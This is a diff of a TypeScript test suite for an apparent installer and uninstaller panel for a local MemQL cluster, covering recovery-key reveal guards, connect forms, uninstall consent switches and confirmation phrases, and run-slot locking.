+    assert.ok(!h.html().includes(RECOVERY_KEY), "the second run's key is behind a click too");
+    assert.match(h.html(), /data-act="revealRecoveryKey"/);
+  } finally {
+    h.close();
+  }
 });
 
 // -----------------------------------------------------------------------------
-// The reveal guard, on every run rather than once per panel (memql#4616)
+// closing mid-run keeps today's abort (memql#4614)
 // -----------------------------------------------------------------------------
 
-test("the reveal guard re-arms for the next run, not once per panel", async () => {
-  // THE DEFECT (memql#4616). `recoveryKeyRevealed` was a field on this panel
-  // that nothing ever reset -- not `back()`, not `beginRun()`. So the
-  // click-to-reveal guard memql#4194 added worked exactly once per panel
-  // lifetime: install, reveal, Back, repair, and the done screen rendered the
-  // NEW plaintext immediately with no click, defeating the guard at precisely
-  // the moment a screen is most likely to be shared.
-  const asked = answering(true);
-  const runner = await fakeRunner(
-    {},
-    { "install.recoveryKey": { recoveryKey: RECOVERY_KEY, recoveryKeyState: "claimed" } },
-  );
-  const h = open({ runner, confirmDestructive: asked.confirmDestructive });
+test("closing the page mid-run aborts the run rather than orphaning it", async () => {
+  const runner = await fakeRunner();
+  const gate = gateOn(runner, "install.dockerAccess");
+  const h = await open({ runner });
   try {
     beginInstall(h);
-    await until(() => /Your cluster is ready/.test(h.html()), "the first run to settle");
-    h.post({ type: "revealRecoveryKey" });
-    assert.ok(h.html().includes(RECOVERY_KEY), "the first reveal works");
-
-    h.post({ type: "back" });
-    await until(() => !/Your cluster is ready/.test(h.html()), "the landing screen");
-
-    // A repair is the same call over the same graph, which is what makes this
-    // the ordinary path rather than a contrived one.
-    beginInstall(h);
-    await until(() => /Your cluster is ready/.test(h.html()), "the second run to settle");
-
-    const html = h.html();
-    assert.ok(
-      !html.includes(RECOVERY_KEY),
-      "the second run's key must be behind a click too: this is the run whose screen " +
-        "is most likely to be shared, because the operator is showing somebody a repair",
-    );
-    assert.match(html, /data-act="revealRecoveryKey"/, "the reveal is offered again");
+    await until(gate.reached, "the run to reach a step inside the graph");
+    h.close();
+    gate.release();
+    await until(() => runner.calls.some((c) => c.capability === "install.dockerAccess"), "the gated step to finish");
+    for (let i = 0; i < 100; i += 1) await new Promise((resolve) => setTimeout(resolve, 1));
+    const ran = runner.calls.map((c) => c.capability);
+    for (const capability of ["install.hostsEntries", "install.nssTools", "install.mkcert", "k3d.up", "install.seedBootstrap", "install.recoveryKey"]) {
+      assert.ok(!ran.includes(capability), `${capability} ran after the page was closed: ${ran.join(", ")}`);
+    }
   } finally {
+    gate.release();
+    h.close();
+  }
+});
+
+// -----------------------------------------------------------------------------
+// connect to a cluster elsewhere
+// -----------------------------------------------------------------------------
+
+test("Escape leaves an empty connect form, and keeps a half-filled one", async () => {
+  // THE DEFECT: Escape in any field discarded every answer.
+  const h = await open({});
+  try {
+    await until(() => /data-value="connect"/.test(h.html()), "the landing");
+    h.post({ type: "choose", value: "connect" });
+    type(h, "connectName", "staging");
+    h.post({ type: "connectEscape" });
+    await new Promise((resolve) => setTimeout(resolve, 10));
+    assert.match(h.html(), /Connect to a cluster/);
+    assert.match(h.html(), /value="staging"/, "Escape wiped the draft");
+    type(h, "connectName", "");
+    h.post({ type: "connectEscape" });
+    await until(() => /data-value="connect"/.test(h.html()), "the landing");
+  } finally {
+    h.close();
+  }
+});
+
+test("the connect form says what it will connect to, as it is typed", async () => {
+  const h = await open({});
+  try {
+    await until(() => /data-value="connect"/.test(h.html()), "the landing");
+    h.post({ type: "choose", value: "connect" });
+    type(h, "connectDomain", "staging.example.com");
+    assert.match(h.html(), /Connects to api\.staging\.example\.com:443/);
+    assert.doesNotMatch(h.html(), /clusters\.yaml|gRPC|JWT|front door|portal/);
+  } finally {
+    h.close();
+  }
+});
+
+test("a connected cluster stays on the page with Sign in, not a toast", async () => {
+  const h = await open({ probeCluster: async () => ({ ok: true }) });
+  try {
+    await until(() => /data-value="connect"/.test(h.html()), "the landing");
+    h.post({ type: "choose", value: "connect" });
+    type(h, "connectName", "staging");
+    type(h, "connectDomain", "staging.example.com");
+    h.post({ type: "connect" });
+    await until(() => /data-act="signIn"/.test(h.html()), "the added screen");
+    assert.match(h.html(), /api\.staging\.example\.com:443/);
+    assert.deepEqual(recorded.infos, [], "no toast: the page carries the next act");
+    assert.match(fs.readFileSync(h.clustersPath, "utf8"), /name: staging/);
+    h.post({ type: "signIn" });
+    await until(() => recorded.executed.includes("memql.clusters.signIn"), "the sign in");
+    // Back, then Connect again: an empty form, not the one just saved (whose
+    // name is now taken).
+    assert.deepEqual(barActs(h.html()), ["back", "signIn"]);
+    h.post({ type: "back" });
+    await until(() => /data-value="connect"/.test(h.html()), "the landing");
+    h.post({ type: "choose", value: "connect" });
+    await until(() => /data-field="connectName"/.test(h.html()), "the form");
+    assert.doesNotMatch(h.html(), /value="staging"/, "the saved cluster's answers came back");
+  } finally {
+    h.close();
+  }
+});
+
+test("a cluster that does not answer is added only on a second, informed press", async () => {
+  const h = await open({});
+  try {
+    await until(() => /data-value="connect"/.test(h.html()), "the landing");
+    h.post({ type: "choose", value: "connect" });
+    type(h, "connectName", "staging");
+    type(h, "connectDomain", "staging.example.com");
+    h.post({ type: "connect" });
+    await until(() => /Add anyway/.test(h.html()), "the warning");
+    assert.match(h.html(), /Can&#39;t reach api\.staging\.example\.com:443\.|Can't reach api\.staging\.example\.com:443\./);
+    assert.ok(!fs.existsSync(h.clustersPath), "nothing is written on the first press");
+    h.post({ type: "connect" });
+    await until(() => fs.existsSync(h.clustersPath), "the second press writes");
+  } finally {
+    h.close();
+  }
+});
+
+// -----------------------------------------------------------------------------
+// uninstall
+// -----------------------------------------------------------------------------
+
+/** What an install that created everything records, as far as the removals read it. */
+function fullReceipt(opts: { clusterPreExisting?: boolean } = {}): unknown {
+  const entry = (stepId: string, receipt: string, result: Record<string, string>, preExisting = false) => ({
+    stepId,
+    script: "x",
+    receipt,
+    preExisting,
+    params: {},
+    result,
+    changed: true,
+    recordedAt: "2026-09-01T00:00:00Z",
+  });
+  return {
+    version: 1,
+    graph: "install",
+    startedAt: "2026-09-01T00:00:00Z",
+    updatedAt: "2026-09-01T00:00:00Z",
+    entries: [
+      entry("toolK3d", "binary", { path: path.join(HOME, ".memql", "bin", "k3d") }),
+      entry("toolKubectl", "binary", { path: path.join(HOME, ".memql", "bin", "kubectl") }),
+      entry("toolMkcert", "binary", { path: path.join(HOME, ".memql", "bin", "mkcert") }),
+      entry("hostsBlock", "hostsEntries", { hostsFile: "/etc/hosts" }),
+      entry("localCA", "mkcertCA", { caroot: path.join(HOME, ".memql", "mkcert") }),
+      entry("stackCheckout", "checkout", { dest: path.join(HOME, ".memql", "src") }),
+      entry("clusterUp", "stack", { cluster: "memql" }, opts.clusterPreExisting === true),
+    ],
+  };
+}
+
+async function openUninstall(over: OpenOptions = {}): Promise<Harness> {
+  const h = await open({
+    verdict: "installed-healthy",
+    registered: true,
+    action: "uninstall",
+    receipt: fullReceipt(),
+    ...over,
+  });
+  await until(() => /Will be removed|No local cluster was found/.test(h.html()), "the preview");
+  return h;
+}
+
+test("the preview names what goes by name, shared tools as switches, off", async () => {
+  const h = await openUninstall();
+  try {
+    const html = h.html();
+    assert.equal(h.panel.title, "Uninstall MemQL");
+    assert.match(html, /The cluster<\/span><span class="ac-row-detail">memql, and everything running in it/);
+    assert.match(html, /Downloaded MemQL files/);
+    assert.match(html, /Asks for your password/);
+    // THE SHARED TOOLS: switches, by friendly name, off -- never a raw path or
+    // a param key (the old rows read "path /Users/<you>/.memql/bin/k3d").
+    for (const name of ["k3d", "kubectl", "Local certificate authority", "mkcert"]) {
+      assert.match(html, new RegExp(`class="mq-switch-label"[^>]*>${name}<`));
+    }
+    assert.doesNotMatch(html, /type="checkbox"(?![^>]*role="switch")/, "an on/off choice is a switch");
+    assert.doesNotMatch(html, /path \/|caroot |\/Users\/|hosts-file /);
+    assert.doesNotMatch(html, /<input[^>]*\schecked[\s>]/, "every switch starts off");
+    assert.deepEqual(barActs(html), ["uninstallBack", "uninstallStart"]);
+  } finally {
+    h.close();
+  }
+});
+
+test("mkcert cannot be chosen without the certificate authority it withdraws", async () => {
+  // THE DEFECT: mkcert alone was skipped "for want of removeLocalCA" and said
+  // nothing -- mkcert is what withdraws the authority, so removing it first
+  // would leave nothing able to.
+  const h = await openUninstall();
+  try {
+    assert.match(h.html(), /id="shared-removeToolMkcert" disabled/);
+    assert.match(h.html(), /Turn on local certificate authority first\./);
+    h.post({ type: "shared", id: "shared-removeToolMkcert", checked: true, value: "removeToolMkcert" });
+    assert.doesNotMatch(h.html(), /id="shared-removeToolMkcert" checked/, "mkcert was switched on alone");
+    h.post({ type: "shared", id: "shared-removeLocalCA", checked: true, value: "removeLocalCA" });
+    // The press while it was unavailable was REFUSED, not remembered: turning
+    // the authority on must not bring mkcert on with it, unasked.
+    assert.doesNotMatch(h.html(), /id="shared-removeToolMkcert" checked/, "a refused press came back on by itself");
+    h.post({ type: "shared", id: "shared-removeToolMkcert", checked: true, value: "removeToolMkcert" });
+    assert.match(h.html(), /id="shared-removeToolMkcert" checked/);
+    // Turning the authority off takes mkcert with it.
+    h.post({ type: "shared", id: "shared-removeLocalCA", checked: false, value: "removeLocalCA" });
+    assert.doesNotMatch(h.html(), /id="shared-removeToolMkcert" checked/);
+  } finally {
+    h.close();
+  }
+});
+
+test("an uninstall starts only from its preview: a stale Uninstall after the removal runs nothing", async () => {
+  const h = await openUninstall();
+  try {
+    h.post({ type: "uninstallStart" });
+    await until(() => /MemQL is uninstalled/.test(h.html()), "the removal");
+    const calls = h.runner.calls.length;
+    h.post({ type: "uninstallStart" });
+    await new Promise((resolve) => setTimeout(resolve, 20));
+    assert.equal(h.runner.calls.length, calls, "a second removal started from the finished screen");
+    assert.match(h.html(), /MemQL is uninstalled/);
+  } finally {
+    h.close();
+  }
+});
+
+test("switched-off tools are skipped and switched-on ones removed", async () => {
+  const h = await openUninstall();
+  try {
+    h.post({ type: "shared", id: "shared-removeToolK3d", checked: true, value: "removeToolK3d" });
+    h.post({ type: "uninstallStart" });
+    await until(() => /MemQL is uninstalled/.test(h.html()), "the removal");
+    const removed = h.runner.calls
+      .filter((c) => c.capability === "install.removeArtifact")
+      .map((c) => `${c.params["kind"]}:${path.basename(c.params["path"] ?? c.params["cluster"] ?? c.params["caroot"] ?? "")}`);
+    assert.ok(removed.includes("binary:k3d"), removed.join(", "));
+    assert.ok(!removed.includes("binary:kubectl"), "a tool left off was removed");
+    assert.ok(!removed.some((r) => r.startsWith("mkcertCA")), "the authority left off was removed");
+  } finally {
+    h.close();
+  }
+});
+
+test("delete-data: the phrase appears with the switch, answers live, and alone permits the act", async () => {
+  const h = await openUninstall({ receipt: fullReceipt({ clusterPreExisting: true }) });
+  try {
+    assert.match(h.html(), /Kept unless you delete its data/);
+    assert.doesNotMatch(h.html(), /data-field="deletePhrase"/, "no phrase before the switch is on");
+    h.post({ type: "deleteData", id: "delete-data", checked: true });
+    assert.match(h.html(), /Type &quot;delete memql data&quot; to confirm|Type "delete memql data" to confirm/);
+    assert.ok(!barActs(h.html()).includes("uninstallStart"), "no act until the phrase matches");
+    type(h, "deletePhrase", "delete memql");
+    assert.match(h.html(), /Doesn&#39;t match yet\.|Doesn't match yet\./);
+    assert.ok(!barActs(h.html()).includes("uninstallStart"));
+    type(h, "deletePhrase", "delete memql data");
+    assert.match(h.html(), /data-act="uninstallStart"[^>]*>Uninstall and delete data</);
+    // The cluster moved from Kept to Will be removed.
+    assert.doesNotMatch(h.html(), /Kept unless you delete its data/);
+    // Off clears the phrase: consent does not survive the switch.
+    h.post({ type: "deleteData", id: "delete-data", checked: false });
+    h.post({ type: "deleteData", id: "delete-data", checked: true });
+    assert.doesNotMatch(h.html(), /value="delete memql data"/);
+  } finally {
+    h.close();
+  }
+});
+
+test("consents do not survive Cancel: the next preview starts with every switch off", async () => {
+  const h = await openUninstall({ receipt: fullReceipt({ clusterPreExisting: true }) });
+  try {
+    h.post({ type: "shared", id: "shared-removeToolK3d", checked: true, value: "removeToolK3d" });
+    h.post({ type: "deleteData", id: "delete-data", checked: true });
+    type(h, "deletePhrase", "delete memql data");
+    h.post({ type: "uninstallBack" });
+    await until(() => /data-value="uninstall"/.test(h.html()), "the landing");
+    h.post({ type: "choose", value: "uninstall" });
+    await until(() => /Will be removed/.test(h.html()), "the preview again");
+    assert.doesNotMatch(h.html(), /<input[^>]*\schecked[\s>]/, "a switch came back on");
+    assert.doesNotMatch(h.html(), /delete memql data"/);
+    assert.ok(!barActs(h.html()).includes("uninstallStart") || !/and delete data/.test(h.html()));
+  } finally {
+    h.close();
+  }
+});
+
+test("a cluster with no install record (make up, or adopted) can be uninstalled from here", async () => {
+  // THE OWNER'S MACHINE: a `local: true` list entry, a live k3d `memql`, and
+  // no receipt. The preview used to refuse ("no receipt at ...") -- a dead end
+  // behind an Uninstall the landing offered. It is the one removal the
+  // observation supports, kept unless its data is deleted, and that needs the
+  // switch and the phrase.
+  const removed: string[] = [];
+  const presence = presenceFor("installed-healthy", { registered: true, overrides: { readReceiptFile: async () => null } });
+  const h = await open({
+    presence,
+    action: "uninstall",
+    listLocalClusters: async () => ["memql"],
+    removeRegistryEntry: async (name) => void removed.push(name),
+  });
+  try {
+    await until(() => /Will be removed/.test(h.html()), "the preview");
+    const html = h.html();
+    assert.doesNotMatch(html, /receipt|No local cluster was found/);
+    assert.match(html, /Kept unless you delete its data/);
+    assert.ok(!barActs(html).includes("uninstallStart"), "an Uninstall that would remove nothing");
+    h.post({ type: "deleteData", id: "delete-data", checked: true });
+    type(h, "deletePhrase", "delete memql data");
+    h.post({ type: "uninstallStart" });
+    await until(() => /MemQL is uninstalled/.test(h.html()), "the removal");
+    const cluster = h.runner.calls.find((c) => c.capability === "install.removeArtifact" && c.params["kind"] === "stack");
+    assert.ok(cluster !== undefined, "the cluster removal ran");
+    assert.equal(cluster.params["cluster"], "memql");
+    assert.equal(cluster.params["confirm"], "delete-memql-data", "the typed consent reached the script");
+    assert.equal(cluster.params["pre-existing"], "true", "and the script still knows MemQL did not make it");
+    assert.deepEqual(removed, ["memql"], "and the list entry goes with it");
+  } finally {
+    h.close();
+  }
+});
+
+test("an unreadable install record is a preview that failed, never 'nothing here'", async () => {
+  // THE DEFECT: the preview's read error landed on "No local cluster was
+  // found on this computer" with Remove from list -- an offer to drop the
+  // entry of a cluster that was still there, because a file could not be
+  // parsed. A failed read is shown as a failure.
+  const removed: string[] = [];
+  const h = await open({
+    verdict: "installed-healthy",
+    registered: true,
+    action: "uninstall",
+    receipt: "not a receipt",
+    // k3d answering nothing (Docker asleep) is exactly when a swallowed read
+    // error would have read as an empty computer.
+    listLocalClusters: async () => [],
+    removeRegistryEntry: async (name) => void removed.push(name),
+  });
+  try {
+    await until(() => /Couldn't work out what would be removed/.test(h.html()), "the failure");
+    const html = h.html();
+    assert.doesNotMatch(html, /No local cluster was found|data-act="removeFromList"|data-act="uninstallStart"/);
+    assert.deepEqual(barActs(html), ["uninstallBack", "openOutput", "uninstallReload"]);
+    // Fixed underneath, Try again reads it again.
+    fs.writeFileSync(h.receiptFile, JSON.stringify(fullReceipt()));
+    h.post({ type: "uninstallReload" });
+    await until(() => /Will be removed/.test(h.html()), "the preview, read again");
+    assert.deepEqual(removed, []);
+  } finally {
+    h.close();
+  }
+});
+
+test("a list entry with nothing on this computer behind it can be removed from the list", async () => {
+  const removed: string[] = [];
+  const presence = presenceFor("installed-unreachable", { registered: true, overrides: { readReceiptFile: async () => null } });
+  const h = await open({
+    presence,
+    action: "uninstall",
+    listLocalClusters: async () => [],
+    removeRegistryEntry: async (name) => void removed.push(name),
+  });
+  try {
+    await until(() => /No local cluster was found/.test(h.html()), "the preview");
+    assert.deepEqual(barActs(h.html()), ["uninstallBack", "removeFromList"]);
+    h.post({ type: "removeFromList" });
+    await until(() => removed.length === 1, "the removal from the list");
+    assert.deepEqual(removed, ["memql"]);
+  } finally {
+    h.close();
+  }
+});
+
+test("dismissing the password prompt removes nothing, and returns to the preview", async () => {
+  // THE DEFECT (high): the uninstall went ahead, deleted the cluster (it needs
+  // no root), then failed on the hosts file.
+  const h = await openUninstall({ sudoIsFree: async () => false });
+  try {
+    setNextInputBoxResult(undefined);
+    h.post({ type: "uninstallStart" });
+    await until(() => recorded.inputBoxes.length === 1, "the prompt");
+    await until(() => /Will be removed/.test(h.html()), "the preview again");
+    assert.ok(!h.runner.calls.some((c) => c.capability === "install.removeArtifact"), "something was removed");
+  } finally {
+    h.close();
+  }
+});
+
+test("an uninstall failure carries the script's remedy, with Run in terminal", async () => {
+  // THE DEFECT: the uninstall state never read `result.remedy`, so a hosts
+  // file that needed the password got the missing-package advice and no
+  // command.
+  const remedy = "sudo remove-artifact.sh --kind=hostsEntries --marker=memql";
+  const runner = await fakeRunner();
+  const inner = runner.run;
+  runner.run = async (run) => {
+    if (run.capability === "install.removeArtifact" && run.params["kind"] === "hostsEntries") {
+      runner.calls.push(run);
+      return {
+        argv: [run.scriptPath],
+        exitCode: 4,
+        signal: null,
+        stdout: "",
+        stderr: "",
+        envelope: {
+          ok: false,
+          capability: "install.removeArtifact",
+          changed: false,
+          result: { remedy },
+          error: { code: 4, message: "couldn't edit /etc/hosts without administrator access" },
+        },
+      };
+    }
+    return inner(run);
+  };
+  const h = await openUninstall({ runner });
+  try {
+    h.post({ type: "uninstallStart" });
+    await until(() => /Couldn't uninstall|Couldn&#39;t uninstall/.test(h.html()), "the failure");
+    const html = h.html();
+    assert.match(html, /Couldn&#39;t remove local addresses|Couldn't remove local addresses/, "the status, in the negative");
+    assert.ok(html.includes(remedy), "the remedy is on the page");
+    assert.match(html, /Run the command in a terminal, then retry\./);
+    assert.doesNotMatch(html, /\. failed|Install the missing prerequisite/);
+    h.post({ type: "remedy", value: "removeHostsBlock" });
+    await until(() => recorded.terminals.length === 1, "the terminal");
+    assert.deepEqual(recorded.terminals[0]!.sent, [{ text: remedy, executed: false }]);
+  } finally {
+    h.close();
+  }
+});
+
+test("Cancel during an uninstall says it is stopping until the step finishes", async () => {
+  const runner = await fakeRunner();
+  const gate = gateOn(runner, "install.removeArtifact");
+  const h = await openUninstall({ runner });
+  try {
+    h.post({ type: "uninstallStart" });
+    await until(gate.reached, "the first removal in flight");
+    h.post({ type: "cancel" });
+    assert.match(h.html(), /Stopping after the current step/);
+    assert.deepEqual(barActs(h.html()), []);
+    gate.release();
+    await until(() => /data-act="resume"|MemQL is uninstalled/.test(h.html()), "the run to settle");
+  } finally {
+    gate.release();
+    h.close();
+  }
+});
+
+// -----------------------------------------------------------------------------
+// the machine's run slot, shared with the Deployment page
+// -----------------------------------------------------------------------------
+
+test("an install is refused while the machine is busy with another run, with Show to it", async () => {
+  // A rebuild on the Deployment page and an install here would be two
+  // answers to what the machine is. The second is refused in one sentence,
+  // and Show brings the running one forward.
+  const runs = new LocalRuns();
+  let revealed = 0;
+  const release = runs.hold({ busy: "rebuilding", reveal: () => (revealed += 1) });
+  assert.ok(release !== undefined);
+  const h = await open({ runs });
+  try {
+    await until(() => /Install MemQL on this computer/.test(h.html()), "the landing");
+    setNextWarningMessageChoice("Show");
+    beginInstall(h);
+    await until(() => recorded.warnings.includes("MemQL: The local cluster is busy rebuilding."), "the refusal");
+    assert.deepEqual(recorded.warningActions[recorded.warnings.indexOf("MemQL: The local cluster is busy rebuilding.")], ["Show"]);
+    await until(() => revealed === 1, "Show to reveal the running one");
+    assert.doesNotMatch(h.html(), /Installing MemQL/, "the install started anyway");
+    assert.equal(h.runner.calls.some((c) => c.capability === "install.dockerAccess"), false, "a step ran");
+  } finally {
+    release!();
+    h.close();
+  }
+});
+
+test("an install holds the machine's slot while it runs, and gives it back when it settles", async () => {
+  const runs = new LocalRuns();
+  const runner = await fakeRunner();
+  const gate = gateOn(runner, "install.dockerAccess");
+  const h = await open({ runner, runs });
+  try {
+    beginInstall(h);
+    await until(gate.reached, "the install to be running");
+    const busy = runs.busy();
+    assert.ok(busy !== undefined, "the Deployment page would start a run under this install");
+    assert.equal(busy.busy, "installing");
+    // The Deployment page's start is refused while it holds it.
+    assert.equal(runs.hold({ busy: "rebuilding", reveal: () => undefined }), undefined);
+    gate.release();
+    await until(() => INSTALLED.test(h.html()), "the run to settle");
+    assert.equal(runs.busy(), undefined, "the slot was not given back");
+  } finally {
+    gate.release();
     h.close();
   }
 });
